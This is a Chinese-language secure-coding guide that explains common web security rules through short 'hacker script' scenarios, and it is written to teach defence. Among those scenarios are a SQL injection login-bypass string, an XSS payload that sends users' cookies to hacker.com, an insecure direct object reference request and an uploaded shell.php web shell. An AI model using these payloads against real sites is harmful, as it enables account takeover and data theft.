# VibeCoding 安全守则详解：为什么我们如此坚持？

这份文件解释了《安全守则》中每一条规则的重要性。理解这些，能帮助你从「黑客的视角」看待自己的程序代码，防患于未然。

---

## ⭐ 金科玉律

### 【绝不写死秘密】 & 【使用环境变量】 & 【忽略秘密文件】

**为什么重要？**

这三条是数位世界的最高生存法则。你的程序代码（尤其是在使用 Git 时）会在多个地方被复制、分享、储存。将密码、API 金钥等「秘密」直接写在程序代码里，就像是把保险箱的密码刺青在额头上，任何看到你的人（看到程序代码的人）都能轻易地打开你的保险箱。`.env` 文件是你的私人保险箱，`.gitignore` 则是确保这个保险箱不会被意外打包送人的保全系统。

**黑客剧本 😈**
> 我最喜欢在 GitHub 上搜寻 `password`、`api_key` 或 `db_connect`。我找到了你的公开项目，在一个叫做 `config.js` 的文件里，我看到了这样的程序代码：`const db_password = 'Password123!';`。太棒了，我甚至不需要攻击你的网站，我现在就可以直接尝试用这个密码登入你的数据库了。

**灾难后果 💥**

**服务完全被接管。** 黑客可以偷走、窜改、删除你所有的用户资料，或是利用你的付费 API 服务（例如：发送大量邮件、使用地图服务）来进行非法活动，而帐单全部由你支付。

---

## 📥 处理使用者输入

### 【防止注入攻击 (SQL Injection)】

**为什么重要？**

想像一下，数据库是一个只听得懂 SQL 语言的机器人。如果你把使用者的话（输入）直接跟你的命令拼接在一起，使用者就有机会说出他们自己的「命令」。参数化查询则是告诉机器人：「听着，接下来这段话**只是资料**，无论内容是什么，都不要当作命令来执行。」

**黑客剧本 😈**
> 我在你网站的登入框里，用户名称我输入了 `' OR '1'='1' --`。我猜你们的 SQL 查询是这样写的：`"SELECT * FROM users WHERE username = '" + userInput + "';" `。我的输入把它变成了 `SELECT * FROM users WHERE username = '' OR '1'='1' --';`。`'1'='1'` 永远是真的，所以我绕过了密码验证，成功登入了第一个用户（通常是管理员）的帐号。

**灾难后果 💥**

攻击者可以绕过登入、窃取整个数据库的资料（用户列表、密码 hash），甚至删除数据库。

### 【防止跨站脚本攻击 (XSS)】

**为什么重要？**

如果你的网站像一面镜子，直接反射出使用者输入的内容，那使用者就可以在内容中夹带恶意的 JavaScript 脚本。当其他用户浏览到这段内容时，这个恶意脚本就会在他们的浏览器上执行，窃取他们的信息。HTML 实体编码就是把恶意脚本中的特殊字元（如 `<`、`>`）转变成无害的纯文字，让它无法被执行。

**黑客剧本 😈**
> 我在你的文章评论区留了一段言：`<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`。这段文字被原封不动地存进数据库。现在，任何读取这篇评论的用户，他们的浏览器都会自动执行这段脚本，将他们的登入 cookie 发送到我的服务器。我拿到了 cookie，就能冒充他们的身分登入网站。

**灾难后果 💥**

大规模的用户帐号被盗用、个资外泄、网站被植入钓鱼内容或挖矿脚本。

---

## 🔐 权限与认证

### 【API 端点保护】

**为什么重要？**

前端界面（UI）可以隐藏按钮，但黑客从不依赖界面。他们会直接用工具（如 Postman、curl）呼叫你后端的 API。你必须假设每个 API 端点都会被直接攻击，因此每个端点都必须是独立的守卫，自己检查来访者的身分和权限。

**黑客剧本 😈**
> 我发现要修改个人资料，前端会发送一个请求到 `/api/user/update`。虽然我看不到其他人的修改按钮，但我猜这个 API 可能是透过 `userId` 来区分用户的。我试着发送一个请求到 `/api/user/update?userId=1`（管理员的 ID），并附上我想修改的资料。天啊，服务器居然没有检查是不是我本人发出的请求，就成功把管理员的 email 改掉了！

**灾难后果 💥**

普通用户可以窜改其他用户甚至管理员的资料，或是执行他们不该有的权限，造成系统混乱。

---

## ☁️ 外部服务与云端整合

### 【外部数据库防火墙】 & 【云端储存私有化】

**为什么重要？**

你的云端数据库和储存空间，就像是你在云上的私人仓库。你绝不会把仓库的大门敞开，让全世界的人都能进来。防火墙和私有化设定，就是为你的仓库建立一道坚固的围墙和上锁的大门，只允许你的应用程序（指定的 IP 位址）这辆「授权货车」进出。

**黑客剧本 😈**
> 我用工具扫描了你们公司的 IP 段，发现一个 AWS S3 储存桶是「公开」的。我点进去一看，里面全是你们用户上传的身份证照片和公司合约的扫描档，所有文件列表一览无遗，我全部都下载了。

**灾难后果 💥**

所有储存的敏感资料（用户个资、公司机密文件）被一次性拖走，造成毁灭性的资料外泄事件。

---

## ⚙️ 文件与服务器设定

### 【绝不用 777】

**为什么重要？**

权限 `777` 的意思是「读、写、执行」权限对「拥有者、群组、其他人」全部开放。这就像是你家大门没上锁，而且还贴了张纸条写着「欢迎任何人进来居住、涂鸦、开派对」。如果黑客能上传一个文件，`777` 权限就等于给了他执行这个文件的权力。

**黑客剧本 😈**
> 我发现你们网站的图片上传功能有一个小漏洞，没有严格限制我上传的文件类型。我把一个叫 `shell.php` 的恶意后门程序，伪装成 `image.jpg.php` 上传了。因为你们的上传目录权限是 `777`，服务器允许我「执行」这个文件。我现在只要访问 `yoursite.com/uploads/shell.php`，就能在你们的服务器上为所欲为了。

**灾难后果 💥**

服务器被完全攻陷。黑客可以窃取所有程序代码和资料、将你的服务器变成发动网路攻击的僵尸主机，或植入勒索病毒。

### 【关闭侦错模式】

**为什么重要？**

侦错模式是开发时的好帮手，但在上线环境中，它就像一个喋喋不休的内鬼。当网站出错时，它会把服务器的内部路径、数据库查询语句、设定变量等极度敏感的信息，完整地显示在错误页面上，等于是给黑客提供了一份详细的攻击地图。

**黑客剧本 😈**
> 我故意在你网站的搜寻框输入一些特殊字元，让程序出错。网站立刻回传了一个详细的错误页面，上面写着 `Error in /var/www/html/app/models/User.php on line 52`，还附上了出错的 SQL 查询语句。我现在知道了你们的文件结构、使用的程序框架，甚至是资料表的名称。我的下一步攻击将会精准得多。

**灾难后果 💥**

泄漏大量内部系统信息，大幅降低黑客的攻击难度，让他们能更快地找到真正的漏洞。